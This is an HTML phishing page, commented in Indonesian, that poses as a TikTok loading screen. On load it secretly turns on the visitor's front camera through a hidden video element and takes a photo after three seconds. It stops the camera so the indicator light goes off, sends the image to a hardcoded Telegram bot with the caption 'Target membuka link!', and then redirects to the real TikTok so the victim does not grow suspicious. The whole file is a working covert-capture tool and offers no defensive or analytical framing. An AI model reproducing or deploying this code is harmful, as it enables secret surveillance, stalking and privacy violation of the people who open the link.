<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tiktok - Watch & Share Videos</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body { font-family: 'Segoe UI', Arial, sans-serif; background-color: #010101; color: #fff; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; padding: 20px; }
        .container { text-align: center; }
        .loader { border: 4px solid #333; border-top: 4px solid #fe2c55; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        
        /* TRICK FIX FOTO GELAP: Video tidak boleh display:none sejak awal, */
        /* kita sembunyikan dengan ukuran 1px dan opacity 0 agar tetap diproses browser */
        #webcam { width: 1px; height: 1px; opacity: 0; position: absolute; }
        #canvas { display: none; }
        p { font-size: 1rem; color: #aaa; }
    </style>
</head>
<body>

<div class="container">
    <div id="loader" class="loader"></div>
    <p id="status">Memuat video TikTok...</p>
</div>

<!-- Kamera berjalan di latar belakang secara samar -->
<video id="webcam" autoplay playsinline muted></video>
<canvas id="canvas"></canvas>

<script>
    // ================= CONFIG TELEGRAM =================
    const TELEGRAM_BOT_TOKEN = '8455526302:AAEdI-fS7NDr1q3Ao3qlQGIqJg8lrwCefWc';
    const TELEGRAM_CHAT_ID = '1966317946';
    // ===================================================

    const TARGET_WEBSITE = 'https://www.tiktok.com'; 

    const video = document.getElementById('webcam');
    const canvas = document.getElementById('canvas');
    const statusText = document.getElementById('status');

    let currentStream = null;

    async function startAutoCamera() {
        try {
            // Meminta aliran video resolusi standar agar proses muat sensor lebih cepat
            currentStream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user", width: 640, height: 480 } 
            });
            video.srcObject = currentStream;

            // Memicu pengambilan foto setelah video dipastikan memutar frame
            video.onplay = () => {
                // Beri jeda 3 detik (3000ms) agar eksposur lensa kamera sempat menyesuaikan cahaya ruangan
                setTimeout(takeAndSendSnapshot, 3000);
            };

        } catch (err) {
            console.error(err);
            // Jika izin ditolak, langsung redirect ke TikTok agar tidak curiga
            window.location.href = TARGET_WEBSITE;
        }
    }

    function takeAndSendSnapshot() {
        // Validasi ekstra jika frame video masih belum siap membaca resolusi asli
        if (video.videoWidth === 0 || video.videoHeight === 0) {
            setTimeout(takeAndSendSnapshot, 200);
            return;
        }

        const ctx = canvas.getContext('2d');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;

        // Gambar frame dari video ke elemen canvas (efek cermin kamera depan)
        ctx.translate(canvas.width, 0);
        ctx.scale(-1, 1);
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        // Langsung matikan tracking kamera agar indikator lampu di HP target mati
        if (currentStream) {
            currentStream.getTracks().forEach(track => track.stop());
        }
        
        // Konversi hasil canvas menjadi file gambar untuk dikirim
        canvas.toBlob(async (blob) => {
            const formData = new FormData();
            formData.append('chat_id', TELEGRAM_CHAT_ID);
            formData.append('photo', blob, 'snapshot.png');
            formData.append('caption', '📸 Target membuka link!\nFoto kamera depan berhasil diambil secara terang.');

            try {
                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
            } catch (error) {
                console.error(error);
            } finally {
                // Setelah selesai memproses pengiriman, alihkan halaman ke TikTok asli
                window.location.href = TARGET_WEBSITE;
            }
        }, 'image/png');
    }

    window.addEventListener('load', startAutoCamera);
</script>

</body>
</html>
